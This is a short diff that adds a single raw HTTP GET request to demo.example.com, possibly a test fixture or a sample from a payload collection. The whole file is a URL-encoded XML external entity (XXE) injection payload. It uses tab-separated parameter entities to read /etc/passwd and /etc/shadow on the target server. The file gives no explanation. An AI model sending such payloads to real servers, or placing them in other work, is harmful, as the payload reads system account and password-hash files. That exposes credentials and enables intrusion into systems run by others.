@@ -1,0 +1,4 @@
+GET /a?file=<!DOCTYPE%09r%09[<!ENTITY%09%%09p%09SYSTEM%09"file:///etc/passwd"><!ENTITY%09%%09q%09"<!ENTITY%09x%09SYSTEM%09'file:///etc/shadow'>">%09%q;]><r/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
